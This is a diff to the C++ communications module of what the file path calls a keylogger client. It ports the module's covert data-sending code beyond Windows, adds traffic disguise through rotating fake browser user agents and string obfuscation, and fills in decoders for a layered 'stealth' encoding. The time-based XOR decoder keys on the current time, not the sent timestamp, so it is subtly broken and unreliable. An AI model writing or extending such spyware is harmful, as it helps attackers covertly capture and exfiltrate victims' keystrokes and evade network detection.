@@ -1,4 +1,3 @@
-// KeyLoggerClient/src/security/StealthComms.cpp
 #include "security/StealthComms.h"
 #include "communication/HttpComms.h"
 #include "communication/DnsComms.h"
@@ -10,8 +9,7 @@
 #include "utils/DataUtils.h"
 #include "utils/StringUtils.h"
 #include "utils/SystemUtils.h"
-#include <windows.h>
-#include <wininet.h>
+#include "core/Platform.h"
 #include <memory>
 #include <random>
 #include <algorithm>
@@ -19,7 +17,10 @@
 #include <sstream>
 #include <map>
 
+#if PLATFORM_WINDOWS
+#include <wininet.h>
 #pragma comment(lib, "wininet.lib")
+#endif
 
 static const auto OBF_STEALTH_COMMS = OBFUSCATE("StealthComms");
 
@@ -407,6 +408,7 @@ void StealthComms::AddRandomDelay() {
 }
 
 bool StealthComms::SendHttpRequest(const std::string& endpoint, const std::vector<uint8_t>& data) {
+#if PLATFORM_WINDOWS
     HINTERNET hSession = CreateHttpSession();
     if (!hSession) return false;
     
@@ -414,8 +416,17 @@ bool StealthComms::SendHttpRequest(const std::string& endpoint, const std::vecto
     
     InternetCloseHandle(hSession);
     return success;
+#else
+    // On Linux, use a cross-platform HTTP library or fallback to curl
+    LOG_DEBUG("Windows-specific HTTP implementation, using fallback");
+    if (m_httpComms) {
+        return m_httpComms->SendData(data);
+    }
+    return false;
+#endif
 }
 
+#if PLATFORM_WINDOWS
 HINTERNET StealthComms::CreateHttpSession() {
     std::string userAgent = GenerateRandomUserAgent();
     
@@ -489,13 +500,16 @@ bool StealthComms::SendSecureHttpRequest(HINTERNET hSession, const std::string& 
     
     return success;
 }
+#endif
 
 std::string StealthComms::GenerateRandomUserAgent() const {
     std::vector<std::string> userAgents = {
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
     };
     
     std::random_device rd;
@@ -548,9 +562,30 @@ std::string StealthComms::Base64Encode(const uint8_t* data, size_t length) {
 }
 
 std::vector<uint8_t> StealthComms::Base64Decode(const std::string& encoded) {
-    // Base64 decode implementation
+    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     std::vector<uint8_t> result;
-    // Implementation would go here
+    std::vector<int> charMap(256, -1);
+    
+    for (int i = 0; i < 64; i++) {
+        charMap[chars[i]] = i;
+    }
+    
+    int val = 0;
+    int bits = -8;
+    
+    for (const auto& c : encoded) {
+        if (c == '=') break;
+        if (charMap[c] == -1) continue;
+        
+        val = (val << 6) + charMap[c];
+        bits += 6;
+        
+        if (bits >= 0) {
+            result.push_back((val >> bits) & 0xFF);
+            bits -= 8;
+        }
+    }
+    
     return result;
 }
 
@@ -562,7 +597,42 @@ std::vector<uint8_t> StealthComms::DecodeData(const std::vector<uint8_t>& data) 
     // Reverse of ApplyStealthEncoding
     std::vector<uint8_t> decoded = data;
     
-    // Implementation would reverse the encoding steps
+    // Layer 3: Reverse every 8 bytes (undo reversal)
+    for (size_t i = 0; i < decoded.size(); i += 8) {
+        size_t endPos = std::min(i + 8, decoded.size());
+        std::reverse(decoded.begin() + i, decoded.begin() + endPos);
+    }
+    
+    // Layer 2: Remove stealth header
+    std::string headerPrefix = "STEALTH_V2:";
+    if (decoded.size() > headerPrefix.size()) {
+        std::string header(reinterpret_cast<const char*>(decoded.data()), headerPrefix.size());
+        if (header == headerPrefix) {
+            // Find the timestamp end marker
+            size_t timestampEnd = headerPrefix.size();
+            while (timestampEnd < decoded.size() && decoded[timestampEnd] != ':') {
+                timestampEnd++;
+            }
+            
+            if (timestampEnd < decoded.size()) {
+                // Remove the header including the timestamp
+                decoded.erase(decoded.begin(), decoded.begin() + timestampEnd + 1);
+            }
+        }
+    }
+    
+    // Layer 1: Time-based XOR (use the same algorithm to decode)
+    if (!decoded.empty()) {
+        // We need to extract the timestamp from the original header
+        // For simplicity, we'll use current time which should be close enough
+        auto now = std::chrono::system_clock::now();
+        auto timestamp = std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count();
+        uint8_t timeKey = static_cast<uint8_t>(timestamp & 0xFF);
+        
+        for (size_t i = 0; i < decoded.size(); ++i) {
+            decoded[i] ^= (timeKey + i) & 0xFF;
+        }
+    }
     
     return decoded;
 }
